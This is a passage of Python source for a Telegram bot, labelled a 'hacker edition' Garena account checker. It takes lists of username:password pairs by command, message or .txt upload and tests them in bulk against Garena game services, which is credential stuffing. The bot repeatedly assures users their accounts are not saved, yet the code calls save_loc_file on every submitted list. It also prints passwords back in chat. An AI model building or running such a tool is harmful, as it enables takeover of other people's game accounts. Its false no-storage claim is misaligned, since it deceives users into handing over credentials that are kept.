    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "❌ Khong co quyen!")
        return
    
    global CUSTOM_AUDIO_DATA
    
    with AUDIO_LOCK:
        CUSTOM_AUDIO_DATA = None
    
    try:
        if os.path.exists(CUSTOM_AUDIO_PATH):
            os.remove(CUSTOM_AUDIO_PATH)
    except:
        pass
    
    safe_send_message(message.chat.id, "✅ Da xoa audio custom!")

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not check_membership(message):
        return
    
    safe_send_message(message.chat.id, f"""
🤖 <b>GARENA CHECKER BOT V6.1 - HACKER EDITION</b>
👤 Admin: @baohuyno1
🎵 TikTok: @baohuy1109

📌 <b>LENH:</b>
/check user:pass - Check 1 acc
/checkmulti user1:pass1,user2:pass2 - Check nhieu
/checkall - Check tat ca
/services - Danh sach service
/stop - Dung check

⚠️ <b>KHONG LUU ACCOUNT!</b>
🔊 AM THANH TU DONG PHAT TREN WEB!
""")

@bot.message_handler(commands=['check'])
def cmd_check(message):
    if not check_membership(message):
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ /check user:pass")
        return
    
    account_str = parts[1]
    service = parts[2] if len(parts) > 2 else "lienquan"
    
    if service not in SERVICE_ROUTES:
        safe_send_message(message.chat.id, f"❌ Service: {', '.join(SERVICE_ROUTES.keys())}")
        return
    
    account_input = account_str.replace('|', ':')
    accounts, _ = loc_tk_mk_only(account_input)
    
    if not accounts:
        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass")
        return
    
    user, pwd = accounts[0]
    threading.Thread(target=check_single, args=(message.chat.id, user, pwd, service)).start()

@bot.message_handler(commands=['checkmulti'])
def cmd_checkmulti(message):
    if not check_membership(message):
        return
    
    text = message.text.strip()
    if text.startswith('/checkmulti'):
        text = text[len('/checkmulti'):].strip()
    
    if not text:
        safe_send_message(message.chat.id, "❌ /checkmulti user1:pass1\\nuser2:pass2")
        return
    
    lines = text.split('\n')
    service = "lienquan"
    
    if lines:
        last_line = lines[-1].strip()
        last_word = last_line.split()[-1] if last_line.split() else ""
        if last_word in SERVICE_ROUTES and len(last_line.split()) == 1:
            service = last_word
            lines = lines[:-1]
        elif last_word in SERVICE_ROUTES and len(last_line.split()) > 1:
            service = last_word
            lines[-1] = last_line.rsplit(last_word, 1)[0].strip()
    
    accounts_input = '\n'.join(lines).replace(',', '\n').replace('|', ':')
    accounts, _ = loc_tk_mk_only(accounts_input)
    
    if not accounts:
        safe_send_message(message.chat.id, "❌ Khong tim thay acc!")
        return
    
    safe_send_message(message.chat.id, f"📊 Check {len(accounts)} accounts...")
    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service)).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    if not check_membership(message):
        return
    
    global pending_accounts
    chat_id = message.chat.id
    
    if chat_id in pending_accounts and pending_accounts[chat_id]:
        accounts = pending_accounts[chat_id]
        pending_accounts[chat_id] = []
        threading.Thread(target=check_all_services, args=(chat_id, accounts)).start()
    else:
        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!")

@bot.message_handler(commands=['services'])
def cmd_services(message):
    if not check_membership(message):
        return
    
    msg = "📋 <b>SERVICE:</b>\n\n"
    for key, value in SERVICE_ROUTES.items():
        msg += f"{value['icon']} <b>{key}</b>: {value['desc']}\n"
    
    safe_send_message(message.chat.id, msg)

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not check_membership(message):
        return
    
    stop_event.set()
    global checking
    checking = False
    safe_send_message(message.chat.id, "🛑 Da dung check!")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not check_membership(message):
        return
    
    global pending_accounts
    
    text = message.text.strip()
    chat_id = message.chat.id
    
    if text.startswith('/'):
        return
    
    accounts, _ = loc_tk_mk_only(text.replace('|', ':'))
    
    if not accounts:
        return
    
    if chat_id not in pending_accounts:
        pending_accounts[chat_id] = []
    pending_accounts[chat_id] = accounts
    save_loc_file(accounts)
    
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    safe_send_message(chat_id, f"""
📊 LOC {total} ACCOUNTS
Preview:
{preview}
👇 /checkall - Check tat ca
⚠️ KHONG LUU ACCOUNT!
""")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not check_membership(message):
        return
    
    global pending_accounts
    chat_id = message.chat.id
    
    try:
        file_name = message.document.file_name or ""
        
        if str(message.from_user.id) == ADMIN_CHAT_ID and (file_name.endswith('.wav') or file_name.endswith('.mp3')):
            global CUSTOM_AUDIO_DATA
            file_info = bot.get_file(message.document.file_id)
            audio_data = bot.download_file(file_info.file_path)
            
            if not audio_data:
                safe_send_message(chat_id, "❌ Khong the tai audio!")
                return
            
            if len(audio_data) > 20 * 1024 * 1024:
                safe_send_message(chat_id, "❌ File qua lon! Gioi han 20MB.")
                return
            
            with AUDIO_LOCK:
                CUSTOM_AUDIO_DATA = audio_data
            
            with open(CUSTOM_AUDIO_PATH, 'wb') as f:
                f.write(audio_data)
            
            file_size_mb = len(audio_data) / (1024 * 1024)
            safe_send_message(chat_id, f"✅ UPLOAD AUDIO THANH CONG! 📦 {file_size_mb:.2f} MB")
            return
        
        if not file_name.endswith('.txt'):
            safe_send_message(chat_id, "❌ Chi ho tro file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        
        accounts, _ = loc_tk_mk_only(content.replace('|', ':'))
        
        if not accounts:
            safe_send_message(chat_id, "❌ Khong tim thay user:pass!")
            return
        
        if chat_id not in pending_accounts:
            pending_accounts[chat_id] = []
        pending_accounts[chat_id] = accounts
        save_loc_file(accounts)
        
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        safe_send_message(chat_id, f"""
✅ LOC {total} ACCOUNTS
Preview:
{preview}
👇 /checkall - Check tat ca
⚠️ KHONG LUU ACCOUNT!
""")
        
    except Exception as e:
        safe_send_message(chat_id, f"❌ Loi: {e}")

def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT V6.1 - HACKER EDITION")
    print("    ADMIN: @baohuyno1")
    print("    TIKTOK: @baohuy1109")
    print("    ===== HIEU UNG 3D + HACKER DEP ===== ")
    print("    ===== AM THANH TU DONG PHAT ===== ")
    print("    ===== KHONG LUU ACCOUNT ===== ")
    print("=" * 60)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
